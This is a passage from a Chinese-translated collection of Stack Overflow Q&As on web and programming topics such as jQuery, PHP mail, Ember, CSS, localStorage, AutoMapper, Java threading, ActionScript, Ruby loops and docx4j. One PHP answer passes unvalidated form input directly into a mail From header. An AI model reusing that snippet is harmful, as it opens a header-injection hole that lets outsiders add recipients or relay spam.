它们通常被命名为“脚本块 (#)”，井号是任意数字，但我也在“其他”部分看到了空白的 html 文档（仅限 html 和 body 标签）。更具体地说，我所指的“其他”部分可以在 Internet Explorer 9 调试器的“脚本”选项卡中“开始调试”按钮左侧的下拉列表中找到。（假设您在生成“其他”的网页上）此外，您当前必须正在调试才能看到“其他”部分。

我有一个带有一些插件的应用程序，我假设这些插件会导致那些“其他”出现。“脚本块”实际上是在生成而不是删除，所以它慢慢开始消耗内存，直到我不得不刷新页面。在网上搜索失败后，我决定来这里希望能更深入地了解为什么要创建这些以及它们到底是什么？

抱歉上面的描述很糟糕，但我真的不知道有更好的方式来描述我在说什么，我想这就是我在这里的原因......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-02T09:40:11.960

这类似于：

![http://i.imgur.com/n6fCYhn.png](https://i.stack.imgur.com/wMhir.png)

在萤火虫（火狐）。

从[他们的 wiki](https://getfirebug.com/wiki/index.php/Script_Panel)来看，这样做的目的是展示三种脚本：

> *   静态：与页面一起加载的所有脚本（通过标签）
>     
>     
> *   eval()：使用 eval() 函数执行的脚本（通常是通过 XMLHttpRequest 加载的脚本）
>     
>     
> *   事件：脚本，通过事件生成（例如客户端表排序）

在 IE 中，您有：

*   `anonymous`，我认为这仅适用于脚本文件中的匿名函数，例如`(function () { })();`.

*   `eval code``eval()`，这是作为语句的结果编译的代码。

*   `javascript:`，我相信这将是一份`onclick="javascript: ... ;"`声明中的内容（不确定那个 - 有人可能会更新）。

和：

*   `script block`，这可能是`<script>`在运行时作为块插入到文档中的代码。

我认为，在每种情况下，IE 都将这些脚本的结果编译到这些文件中以便快速访问，就像缓存一样。空白文档可能是 IE 没有可视化表示的东西。

虽然这个答案不是最完整的，因为我给出了很多假设，我希望它有所帮助！

# jquery - 带有复选框的 JQuery 下一个兄弟

> ID：16204606
> 
> 赞同：0
> 
> 时间：2013-04-25T00:43:29.497
> 
> 标签：jquery, dom, siblings

我有由第三方工具生成的代码，如下所示：

```
<tr id="abc0">
  <td class="ABC" id="abc0_def">
    <input onclick="..." type="checkbox" />
  <td class="BodySpacer">
  <td class="ABC" id"abc0_hij">
    <input onclick="..." type="checkbox" />
<tr id="abc1">
  <td class="ABC" id="abc1_def">
    <input onclick="..." type="checkbox" />
  <td class="BodySpacer">
  <td class="ABC" id"abc1_hij">
    <input onclick="..." type="checkbox" /> 
```

如您所见， td 标签未正确关闭，我无法控制。

对于`abcX_def`如何自动选中中的复选框`abcX_hij`？

我试过了：

```
var n = $(this).parent().nextAll().has(":checkbox").first().find(":checkbox");
n.attr("checked","checked"); 
```

但这似乎不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T00:49:00.707

尝试

```
$(this).closest('tr').find(':checkbox').not(this).prop('checked', $(this).is('checked')) 
```

演示：[小提琴](http://jsfiddle.net/arunpjohny/8pz5e/1/)

# php - 使用 PHP 向手机发送短信时，如何控制发件人姓名？

> ID：16204609
> 
> 赞同：0
> 
> 时间：2013-04-25T00:43:40.190
> 
> 标签：php, email, mobile, sms

我的脚本如下所示：

```
<?php    
mail('xxxxxxxxxx@msg.telus.com', '', 'Message', 'From: John Doe \r\n', '-fxxxxxxxxxx@email.com');
?> 
```

当我通过将脚本发送到我的手机来测试脚本时，它可以正常接收消息，但它说消息来自“9999999999”。我的问题：

1.  9999999999 是什么意思？我可以从谷歌收集到的最好的信息是它表示私人号码/垃圾邮件。
2.  有没有办法让发件人显示为“Jon Doe”？本质上，我需要能够使用 PHP 脚本来控制电话接收到消息时显示在消息上的发件人姓名。

我正在使用 Android 手机 (Galaxy S3) 进行测试，但这需要能够在所有手机和所有服务提供商上运行。有什么解决办法吗？

**更新**

经过一些测试，这是我发现的：

*   使用 Fred 的解决方案，根本不会发送任何消息。
*   如果我在 Fred 的解决方案中去掉标题参数中的名称，并去掉电子邮件周围的括号，我会得到与以前相同的结果（它在发件人字段中发送 9999999999）。
*   如果在实施上述更改后，我将电子邮件从一个确实存在的地址（到目前为止我一直在使用我的电子邮件）更改为一个不存在的地址，我会得到相同的 9999999999 结果。
*   如果我将电子邮件更改为非电子邮件格式的内容（例如，只有 John Doe 而不是 john@doe.com），它根本不会发送。

我的手机和我妈妈的手机都是这种情况（不同的型号 - 不是智能手机 - 但使用相同的服务提供商，她的手机是 6245 而不是 9999999999）。考虑到这一点，并且由于 Fred 的解决方案对他有效，但对我无效，我只能得出结论，这取决于提供者。此外，在我的提供商的情况下，无论电子邮件服务器是否实际存在，他们都必须使用正则表达式来确保标头的格式为电子邮件。我想我将不得不更多地研究 mail() 函数。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-04-25T00:57:16.330

在这里，试试这个尺寸：

```
<?php    
mail('xxxxxxxxxx@msg.telus.com', '', 'Message', "From: John Doe <xxxxxxxxxx@email.com>\r\n");
?> 
```

**添加的选项：**

例如，如果您的表单包含影响以下内容的内容：

```
<label for='name'>Enter Name: </label>
<input type="text" name="name">

<label for='email'>Enter Email Address:</label>
<input type="text" name="email">

<textarea rows="2" name="message" cols="20"></textarea> 
```

然后你可以使用这样的东西：

```
<?php

$name = $_POST['name'];
$email = $_POST['email'];
$message = $_POST['message'];

mail("xxxxxxxxxx@msg.telus.com", "Subject here", "$message", "From: $name <$email>\r\n");
echo "Message sent.";

?> 
```

我假设，当然。

# ember.js - 在ember js中构造一个动态的类名

> ID：16204611
> 
> 赞同：3
> 
> 时间：2013-04-25T00:43:48.247
> 
> 标签：ember.js, handlebars.js

使用 Ember.js - 在我的车把模板中，我希望能够基于我存储的多个属性“构建”一个 css 类。

我的数据如下所示：

```
App.AddonChoices.FIXTURES = [
  { id:101, title: 'Bark' },
  { id:102, title: 'Teal' },
  { id:103, title: 'Tangerine' }
]

App.AddonItem.FIXTURES = [{
      id: 100,
      name: 'Scratch Pad',
      class: 'scratch',
      selected: null,
      choices: [101, 102, 103] //['Bark', 'Teal', 'Tangerine']
    }] 
```

我想基于 id 而不是标题来构建我的 css，因为名称会不时更改（但你不能在类中使用纯数字）所以我的目标是一些看起来像这样的 html

```
<li class='scratch101'>Bark</li> 
```

类是**addonItem.class**和**addonChoices.id的****组合**

 ****我知道我可以向 AddonChoices 添加一个类，但我想避免这种情况，因为它是我不需要跟踪的额外数据。

关于如何在车把模板中构造类名的任何想法？

**更新：** 我最终使用视图解决了它......在@louiscoquio的帮助下

创建了一个视图并将函数**tileClass**包含在**classNameBindings**中：

```
 App.Tiles = Ember.View.extend({
  type:null,
  id:null,
  tagName:'li',
  classNameBindings: ['type', 'title', 'tileClass'],
  tileClass: function(){
  return  this.get('type') + this.get('id')
  }.property('type', 'id')
 }); 
```

在我的模板中调用视图，如下所示：

```
 {{ view App.Tiles 
     titleBinding= 'addonChoices.title'  
     idBinding= 'addonChoices.id'
     typeBinding= 'addonItem.class' }} 
```

呈现这个 html

```
<li title="Kiwi" id="ember494" class="ember-view scratch scratch105 Kiwi"></li> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-26T12:52:31.723

我假设您正在使用 ember 数据，因为您正在使用`FIXTURES`.

鉴于这些`AddonItem`和`AddonChoices`​​模型：

```
AddonItem = DS.Model.extend({
  choices: DS.attr('hasMany', 'App.AddonChoices'),
  class: DS.attr('string')
});

AddonChoices = DS.Model.extend({
  owner: DS.attr('belongsTo', 'App.AddonItem'),
  title: DS.attr('string')
}); 
```

`AddonChoices`您可以像这样在模型中定义计算属性：

```
AddonChoices.reopen({
  ownerClassAndId: function() {
    return this.get('owner.class') + this.get('id');
  }.property('owner.class', 'id')
}); 
```

您会注意到该属性取决于`owner.class`和`id`。这意味着每次`owner.class`or`id`更改时都会重新计算该属性。

无论如何，我认为这个计算属性不应该在模型中定义，而应该在控制器（甚至是视图，对于这个用例）中定义。****

# html - 容器上的重叠元素

> ID：16204619
> 
> 赞同：-1
> 
> 时间：2013-04-25T00:44:40.970
> 
> 标签：html, css, overlapping

我正在开发一个网站，但我在容器类中添加滑块的位置被卡住了。

我的滑动条与我的部分重叠，在我的侧边栏添加 margin-top 之后，我的所有标签都得到了 margin-top。

我该如何解决这个问题？

这是我的 HTML 代码：

```
<body>

<nav class="cf">
    <ul>
        <li><a href="#" class="current">Home</a> </li>
        <li><a href="#">About</a> </li>
        <li><a href="#">Services</a> </li>
        <li><a href="#">Porfolio</a> </li>
        <li><a href="#">Contact</a></li>
    </ul>
</nav>
<div id="container"> 
```

```
 <div class="info1">
                <img src="images/infoicon1.png" alt="icon1">
                <h1>Best services</h1><br>
                <p>We offer you best web solutions for business.</p>
        </div>
<div class="info2">
                <img src="images/infoicon2.png" alt="icon1">
                <h1>Cloud System</h1><br>
                <p>Be unique !! Get cloud system for your business.</p>
        </div>
        <div class="info3">
                <img src="images/infoicon3.png" alt="icon1">
                <h1>Contact us</h1><br>
                <p>Start improving your online business.</p>
        </div> 
```

```
<div id="s3slider">
<ul id="s3sliderContent">
    <li class="s3sliderImage">
        <img src="wide/6.jpg">
        <span>Your text comes here</span>
    </li>
    <li class="s3sliderImage">
        <img src="wide/2.jpg">
        <span>Your text comes here</span>
    </li>
    <div class="clear s3sliderImage"></div>
</ul> 
```

这是我的CSS代码

```
body {
  background: #ffffff;
  font-family: 'Open Sans', sans-serif;
  font-size: 100%;
  width: 100%;
  margin: 0 auto;
  padding: 0;

nav {
   background: #333333;
  height: 60px;
  margin-top: 8%;
    }
nav ul {
  list-style: none;
  padding: 0;
  margin: 0 auto;   
  position: absolute;
  left: 30%;}

nav ul li {
  float:left;
  display: inline;
  font-size: 120%;
  padding:16px;
}
nav ul li a {
  color: #ffffff;
  text-decoration: none;
  display: inline-block;}

nav a:link, nav a:visited { 
  color: #ffffff;
  height:60px;}

#container {
  position: relative;
  width: 80%;
  left: 10%;}

#mainHeader {
  margin-top: 1%;
  display: block;}

.info1 {
  position: absolute;
  background: #0088cc;
  width: 30%;
  border-radius: 9px;}

.info1 img {
  width: 30%;
  height: 0 auto;
  float:left;
  margin-top: 1%;}`.info1 h1 {
  float:left;
  margin-top: 1%;
  color: #ffffff;
  margin-left: 8%;`

.info1 p {
  float:left;
  width: 60%;
  margin: 0;
  margin-bottom: 1%;
  padding-left: 3%;}

#s3slider {
  width:98%; /* important to be same as image width */
  height: 300px; /* important to be same as image height */
  position: relative; /* important */
  overflow: hidden;} /* important */

#s3sliderContent {
  width: 98%; /* important to be same as image width or wider */
  position: absolute; /* important */
  top: 0; /* important */
 margin-left: 0; /* important */`

  .clear {
     clear: both;} 
```

例子： [一个链接](http://imageshack.us/photo/my-images/17/66049913.png/)！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T00:53:03.943

因为`.info1`is `position: absolute;`and 更好地`display:inline-block;`用于`.info1 h1`and`.info1 p`而不是`float:left;`. 如果您仍希望将其定位为绝对。给`nav`/`.info1`一个`margin-bottom: height-of-info1;`

制作[小提琴](http://jsfiddle.net/)以获得更好的解决方案。

# javascript - JavaScript - JSON - 本地存储

> ID：16204620
> 
> 赞同：1
> 
> 时间：2013-04-25T00:44:50.203
> 
> 标签：javascript, jquery, html, css, json

谁能告诉我为什么尝试运行此代码时我的页面上没有输出任何内容？

我正在尝试解析 localStorage 项目并使用 for 循环为每个项目创建一个表。然后我添加总价。

注意：localStorage 包含 3 个项目并且*不*为空。

```
<!DOCTYPE html>
<html>
<head>
    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
    <meta content="utf-8" http-equiv="encoding">
    <style>img{ height: 100px; float: left; }</style>
    <link rel="stylesheet" type="text/css" href="style.css">

    <script src="http://code.jquery.com/jquery-1.7.1.min.js"></script>

    <script>

        function ShoppingCart() {

            var totalPrice = 0;
            var output;

        for (var i = 0; i < localStorage.length; i++){

           var product =  localStorage.getItem('Product_'+i);

            var result = JSON.parse(product);

            var productName;
            var productAlbum;
            var productQuantity;
            var productPrice;
            var productSubTotal = 0;
            var totalPrice;

           productName = result.name
           productAlbum = result.album;
           productQuantity = result.quantity;
           productPrice = parseFloat(result.price);
           productSubTotal = productQuantity * productPrice;

           totalPrice = totalPrice + productSubTotal;

            outputName = "<div id='cart-table'><table><tr><td>NAME:" + productName + "</td></tr></div>" ;
            outputAlbum = "<tr><td>ALBUM:" + productAlbum + "</td></tr>" ;
            outputQuantity = "<tr><td>QUANTITY:" + productQuantity + "</td></tr>";
            outputPrice = "<tr><td>PRICE:" + productPrice + "</td></tr>";
            outputSubTotal = "<tr><td>SUB-TOTAL" + productSubTotal + "</td></tr></table><br><br>";

                        }

            var outputTotal = "<table><tr><td>" + totalPrice + "</td></tr></table>";
            var TotalOutput = outputName + outputAlbum + outputQuantity + outputPrice + outputSubTotal + outputTotal;
            document.getElementById("Cart-Contents").innerHTML=TotalOutput

                    alert(TotalOutput);
        }

          window.onload = ShoppingCart();

    </script>

</head>
<body>
<div id="wrapper">

    <header id="header">
        <strong><table id="menu"><tr><td>Home</td><td>Contact</td><td>Login</td><td></td><td>Products</td></tr></table></strong>
    </header>
    <section id="middle">

        <div id="container">
            <div id="content">
                <a class=""  onclick="ShoppingCart()"><span>Cart</span></a>
                <div id="Cart-Contents">

            </div>

            </div><!-- #content-->
        </div><!-- #container-->

        <aside id="sideLeft">
            <strong>Left Sidebar:</strong>
        </aside><!-- #sideLeft -->

        <aside id="sideRight">
            <strong>Right Sidebar:</strong>
        </aside><!-- #sideRight -->

    </section><!-- #middle-->

</div><!-- #wrapper -->

<footer id="footer">
    <strong>by Brian Livori</strong>
</footer><!-- #footer -->
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T00:58:22.513

很简单，只要改变

```
window.onload = ShoppingCart(); 
```

到

```
window.onload = ShoppingCart; 
```

`window.onload`是一个回调函数引用。当您分配时`ShoppingCart()`- 您实际上将函数执行的结果分配给`window.onload`。

这里的例子[http://jsbin.com/urikub/1/edit](http://jsbin.com/urikub/1/edit)

# c# - AutoMapper 和和解？

> ID：16204625
> 
> 赞同：1
> 
> 时间：2013-04-25T00:45:29.740
> 
> 标签：c#, .net, automapper, automapper-2

如何使用自动映射器协调列表？

例如给定一个类

```
public class SomeEntity
{
    public Guid Id {get; set;}
    public string Name {get; set;}
} 
```

还有一堂课

```
public class SomeAggregate
{
    public IEnumerable<SomeEntity> EntityEnumeration {get;set;}
} 
```

为了这个问题（我的实际要求有点不同）。我需要将 SomeAggregate 的一个实例映射到它的另一个实例。我想使用 AutoMapper，但我需要自定义`EntityEnumeration`填充方式。

这就是我想要实现的目标：

```
Mapper.CreateMap<SomeAggregate,SomeAggregate>()
    .ForMember(d => d.SomeAggregate, *** MISSING LOGIC ***);

Mapper.Map(newInstance, existing); 
```

*** MISSING LOGIC ***需要替换为检查以下内容的代码：

1.  如果为空，则复制所有 RHS
2.  如果不为null，则检查LHS 是否有相同的成员`Id`，如果没有则添加RHS 中的成员。
3.  如果 LHS 具有相同的`Id`，只需更新`Name`匹配实体的属性。
4.  如果 LHS 具有`Id`RHS 中不存在的 ，请`Id`从 LHS 中删除 。

我什至不知道从哪里开始，因为我无法在同一个 lambda 委托中获取 LHS 和 RHS 的实例来进行这种比较。至少没有一个内置选项似乎让我做这种映射。我认为这应该是一个相当常见的用例。

请帮忙。

# java - 在 Java 中捕获 InputStreamReader 的特定部分

> ID：16204630
> 
> 赞同：0
> 
> 时间：2013-04-25T00:45:48.897
> 
> 标签：java, loops, command-line-arguments, ping, interrupt

因此，我正在开发一个从命令行 ping 从 IP 列表中选择的 IP 的次要 GUI。我有这个工作并通过getInputStream返回输出。

这是我用于运行 ping 的代码：

```
 String pingResult = "";
    try {
        Runtime r = Runtime.getRuntime();
        Process p = r.exec("ping " + IPAddressList.getSelectedValue());
        try (BufferedReader in = new BufferedReader(new InputStreamReader
                (p.getInputStream()))) {
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                System.out.println(inputLine);
                pingResult += inputLine;
            }
        }

    }//try
    catch (IOException e) {
        System.out.println(e);
    } 
```

我现在需要做的是来自 IP 列表（存储在带有 DefaultModel 名称机器的 Jlist 中），我需要不断地允许 ping 列表的 IP 并更新列表（我'我知道如何进行更新）。

我不知道如何使用上面的一些代码来启动这个循环并保持它运行。此外，在它运行时，我需要确保 GUI 可以执行其他操作，例如：从列表中删除 IP、将 IP 添加到列表、ping 单个 IP 等。

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T02:44:10.947

您可以在不同的线程上启动 try 循环中的所有内容，以便它独立运行，然后您可以在它继续运行的同时做任何您想做的事情（添加/删除 IP）。

按照本教程进行操作，您将找到您需要的大部分内容： [Java 教程：并发](http://docs.oracle.com/javase/tutorial/essential/concurrency/index.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T02:48:14.270

您需要在后台线程中启动 ping。使用 a`SwingWorker`可能是实现这一点的最简单方法。你可以很容易地向它传递一个 IP 地址列表，它会在后台运行 ping 每个地址，然后将中间结果传递回你的 GUI。该类的优点之一`SwingWorker`是它确保结果的处理发生在 Swing 的主事件调度线程中，因此您不需要做任何额外的事情来处理它。

Javadoc 很好地概述了它的用法：

[http://docs.oracle.com/javase/7/docs/api/javax/swing/SwingWorker.html](http://docs.oracle.com/javase/7/docs/api/javax/swing/SwingWorker.html)

下面是一个粗略的起点。然后您将实例化它并调用它的`execute()`方法来启动后台进程。

```
class PingWorker extends SwingWorker<Void, PingResult> {
    private List<IpAddress> addresses;

    public PingWorker(List<IpAddress> addresses) {
        this.addresses = addresses;
    }

    @Override
    protected Void doInBackground() throws Exception {
        for (IpAddress address : addresses) {
            // run ping code and build result
            publish(new PingResult(address /* other result params here */));
        }

        // no need to return anything as we are processing the intermediate results
        return null;
    }

    @Override
    protected void done() {
        // pings are complete, update GUI to reflect this
    }

     @Override
     protected void process(List<PingResult> results) {
         for (PingResult result : results) {
             // update GUI with the result of the ping such as your table model
         }
     }
} 
```

# actionscript-3 - 数组重复不起作用

> ID：16204631
> 
> 赞同：0
> 
> 时间：2013-04-25T00:45:56.147
> 
> 标签：actionscript-3, flash

我正在尝试在数组中创建一个随机实例和一个正确排序的对象实例，但由于某种原因它无法正常工作。这是它的代码：

```
import flash.sampler.NewObjectSample;
import flash.display.Sprite;
import flash.events.MouseEvent;

var eating_breakfast:Sprite;
var walking:Sprite;
var swimming:Sprite;
var art:Sprite;
var choices:Array = new Array ();
var i: Number = 0;

eating_breakfast = new Sprite ();
eating_breakfast.graphics.beginFill(0xE39D43);
eating_breakfast.graphics.drawRect(0,0,50,50);
eating_breakfast.graphics.endFill();
eating_breakfast.x = 50;
eating_breakfast.y = 50;

walking = new Sprite ();
walking.graphics.beginFill(0xC3266C);
walking.graphics.drawRect(0,0,50,50);
walking.graphics.endFill();
walking.x = 100;
walking.y = 100;

swimming = new Sprite ();
swimming.graphics.beginFill(0x48AFD1);
swimming.graphics.drawRect(0,0,50,50);
swimming.graphics.endFill();
swimming.x = 150;
swimming.y = 150;

art = new Sprite ();
art.graphics.beginFill(0xafdb44);
art.graphics.drawRect(0,0,50,50);
art.graphics.endFill();
art.x = 200;
art.y = 200;

choices.push ( eating_breakfast);
choices.push (walking);
choices.push (swimming);
choices.push (art);

stage.addEventListener (MouseEvent.CLICK, switchpic);
var indexcount = 0 ;
var randomize : Number ;
civilizedorder () ;
randomizedorder ();

function switchpic(d:MouseEvent){
removeChild (choices [indexcount - 1]);
removeChild (choices [randomize]);
civilizedorder ();
randomizedorder ();

}

function civilizedorder () {
    addChild (choices [indexcount]);
    choices [indexcount].x = 300;
    indexcount++;
    trace (indexcount);
}
trace ("The number of choices in the choice array is " + choices.length);

function randomizedorder (){
randomize  = Math.floor( Math.random () * choices.length);
trace ("the random number is" + randomize);
addChild (choices [randomize]);

} 
```

请有人可以解释为什么会发生这种情况..根据我的分析，当 indexcount == randomize 时似乎会发生这种情况..我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T02:42:32.910

您需要做的是将您创建的实例包装在一个类或函数中。

```
public var choices:Array;

function Main()
{
    choices = [eatingBreakfast, walking];

    var randomIndex:int = Math.random() * choices.length;
    var choice:Function = choices[randomIndex] as Function;
    var yourSprite:Sprite = choice();

}

function eatingBreakfast():Sprite
{
    var instance:Sprite =  new Sprite;
    instance.graphics.beginFill(0xE39D43);
    instance.graphics.drawRect(0,0,50,50);
    instance.graphics.endFill();
    instance.x = 50;
    instance.y = 50;
    return instance;
}

function walking():Sprite
{
    var instance:Sprite =  new Sprite;
    instance.graphics.beginFill(0xE39D43);
    instance.graphics.drawRect(0,0,50,50);
    instance.graphics.endFill();
    instance.x = 50;
    instance.y = 50;
    return instance;
} 
```

此示例使用返回`Sprite`实例的函数，但我建议使用每个类型的类或基于某种标识符返回实例的函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T01:55:13.457

看起来你有几个问题。1 您永远不会重置您的 indexcount 编号，这会导致它尝试访问超出您选择数组长度长度的值（即您允许 indexcount 大于choices.length）。如果您尝试添加两次艺术，您也正确推测，您在舞台上只有 1 个实例。但是，当您移除精灵时，您不会检查它是否存在或应该存在。

```
eating_breakfast = new Sprite ();
eating_breakfast.name = "eating_breakfast";
eating_breakfast.graphics.beginFill(0xE39D43);
eating_breakfast.graphics.drawRect(0,0,50,50);
eating_breakfast.graphics.endFill();
eating_breakfast.x = 50;
eating_breakfast.y = 50;

walking = new Sprite ();
walking.name = "walking";
walking.graphics.beginFill(0xC3266C);
walking.graphics.drawRect(0,0,50,50);
walking.graphics.endFill();
walking.x = 100;
walking.y = 100;

swimming = new Sprite ();
swimming.name = "swimming";
swimming.graphics.beginFill(0x48AFD1);
swimming.graphics.drawRect(0,0,50,50);
swimming.graphics.endFill();
swimming.x = 150;
swimming.y = 150;

art = new Sprite ();
art.name = "art";
art.graphics.beginFill(0xafdb44);
art.graphics.drawRect(0,0,50,50);
art.graphics.endFill();
art.x = 200;
art.y = 200;

choices.push(eating_breakfast);
choices.push(walking);
choices.push(swimming);
choices.push(art);

stage.addEventListener(MouseEvent.CLICK, switchpic);
var indexcount = -1;
var randomize:Number;
civilizedorder();
randomizedorder();

function switchpic(d:MouseEvent) {
    removeChild(choices[indexcount]);
    if(choices[indexcount].name != choices[randomize].name){
        removeChild(choices[randomize]);
    }
    civilizedorder();
    randomizedorder();
}    

function civilizedorder() {
    indexcount++;
    if(indexcount == choices.length-1){
        indexcount = 0;
    }
    trace("adding " + choices[indexcount].name);
    addChild(choices[indexcount]);
    choices[indexcount].x = 300;
}
trace("The number of choices in the choice array is " + choices.length);

function randomizedorder() {
    randomize = Math.floor(Math.random() * choices.length);
    trace("adding " + choices[randomize].name);
    addChild(choices[randomize]);

} 
```

抱歉，我还在精灵中添加了 .name，以便更容易看到发生了什么。

# ruby - 如何对 ruby 循环中的每个 n 操作做一些事情？

> ID：16204633
> 
> 赞同：1
> 
> 时间：2013-04-25T00:46:01.287
> 
> 标签：ruby, loops

所以，我有一个 ruby​​ 循环，我如何在其中每 50 次迭代打印一条消息，如下所示：

```
loop do
  do something
  break if something happend
  puts "Message at every 50 iteration"
end 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T00:48:13.447

保留一个计数变量，每次它可以被 50 整除时做一些事情。

```
i = 0;

loop do
  i += 1

  if i % 50 == 0
    puts "This prints every 50 iterations"
  end
end 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-25T05:34:29.013

Donald Knuth（可能不在 Ruby 中）会使用倒数索引而不是递增索引。这使检查更容易。正如 sigmavirus24 指出的那样，它还避免了整数溢出的问题。

```
i = 50
loop do
  # do something
  break if something happend # (as in original)
  i -= 1
  next unless i.zero?
  i = 50
  puts "Message at every 50 iteration"
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T02:15:56.010

考虑到您的情况，`c`我认为最干净的方法是使用`while`循环（或`unless`取决于条件）：

```
while c do
    i = (i) ? i + 1 : 1
    puts "This prints every 50 iterations" if (i % 50 == 0)
end 
```

# jboss7.x - 无法在 JBoss 7 中使用 docx4j

> ID：16204635
> 
> 赞同：5
> 
> 时间：2013-04-25T00:46:22.273
> 
> 标签：jboss7.x, docx4j

我能够使用 docx4j ( [http://www.docx4java.org](http://www.docx4java.org) ) 成功创建一个简单的项目。这个简单的项目成功地创建并写入了 .docx 文档。现在我正试图在一个更大的项目中完成同样的事情。这个更大的项目是一个在 JBoss AS 7.1 中运行的 webapp。但是，在我的第一个与 docx4j 相关的代码行中：

```
WordprocessingMLPackage wmlp = WordprocessingMLPackage.createPackage(); 
```

它遇到一个错误：

```
java.lang.NoClassDefFoundError: Could not initialize class org.docx4j.jaxb.Context
    at org.docx4j.openpackaging.parts.JaxbXmlPart.<init>(JaxbXmlPart.java:79) [docx4j-2.8.1.jar:]
    at org.docx4j.openpackaging.parts.JaxbXmlPartXPathAware.<init>(JaxbXmlPartXPathAware.java:64) [docx4j-2.8.1.jar:]
    at org.docx4j.openpackaging.parts.WordprocessingML.DocumentPart.<init>(DocumentPart.java:157) [docx4j-2.8.1.jar:]
    at org.docx4j.openpackaging.parts.WordprocessingML.MainDocumentPart.<init>(MainDocumentPart.java:76) [docx4j-2.8.1.jar:]
    at org.docx4j.openpackaging.packages.WordprocessingMLPackage.createPackage(WordprocessingMLPackage.java:432) [docx4j-2.8.1.jar:]
    at org.docx4j.openpackaging.packages.WordprocessingMLPackage.createPackage(WordprocessingMLPackage.java:421) [docx4j-2.8.1.jar:]
    at foo.servlets.bar.DocxServlet.doGet(DocxServlet.java:101) [classes:]
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:734) [jboss-servlet-api_3.0_spec-1.0.0.Final.jar:1.0.0.Final]
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:847) [jboss-servlet-api_3.0_spec-1.0.0.Final.jar:1.0.0.Final]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:329) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:248) [jbossweb-7.0.13.Final.jar:]
    at foo.includes.other.ServletNameSetFilter.doFilter(ServletNameSetFilter.java:83) [fooClasses.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:280) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:248) [jbossweb-7.0.13.Final.jar:]
    at foo.includes.other.HtmlEscapeFilter.doFilter(HtmlEscapeFilter.java:67) [fooClasses.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:280) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:248) [jbossweb-7.0.13.Final.jar:]
    at foo.includes.other.SetCharacterEncodingFilter.doFilter(SetCharacterEncodingFilter.java:64) [fooClasses.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:280) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:248) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:275) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:161) [jbossweb-7.0.13.Final.jar:]
    at org.jboss.as.jpa.interceptor.WebNonTxEmCloserValve.invoke(WebNonTxEmCloserValve.java:50) [jboss-as-jpa-7.1.1.Final.jar:7.1.1.Final]
    at org.jboss.as.web.security.SecurityContextAssociationValve.invoke(SecurityContextAssociationValve.java:153) [jboss-as-web-7.1.1.Final.jar:7.1.1.Final]
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:155) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:368) [jbossweb-7.0.13.Final.jar:]
    at org.apache.coyote.ajp.AjpProcessor.process(AjpProcessor.java:505) [jbossweb-7.0.13.Final.jar:]
    at org.apache.coyote.ajp.AjpProtocol$AjpConnectionHandler.process(AjpProtocol.java:445) [jbossweb-7.0.13.Final.jar:]
    at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:930) [jbossweb-7.0.13.Final.jar:]
    at java.lang.Thread.run(Thread.java:636) [rt.jar:1.6.0_20] 
```

此外，当我停止并重新启动服务器而不重建 EAR 时，不会出现此错误，而是从同一方法调用 (createPackage()) 获得 NoSuchElementException：

我相信这与 JBoss 有自己的 JAXB 实现有关，但 JAXBContext 是在 docx4j 库中初始化的。这是代码（来自[http://www.docx4java.org/trac/docx4j/browser/trunk/docx4j/src/main/java/org/docx4j/jaxb/Context.java](http://www.docx4java.org/trac/docx4j/browser/trunk/docx4j/src/main/java/org/docx4j/jaxb/Context.java)）：

```
jc = JAXBContext.newInstance("org.docx4j.wml:" +
                "org.docx4j.dml:org.docx4j.dml.chart:org.docx4j.dml.chartDrawing:org.docx4j.dml.compatibility:org.docx4j.dml.diagram:org.docx4j.dml.lockedCanvas:org.docx4j.dml.picture:org.docx4j.dml.wordprocessingDrawing:org.docx4j.dml.spreadsheetdrawing:org.docx4j.dml.diagram2008:" +
                // All VML stuff is here, since compiling it requires WML and DML (and MathML), but not PML or SML
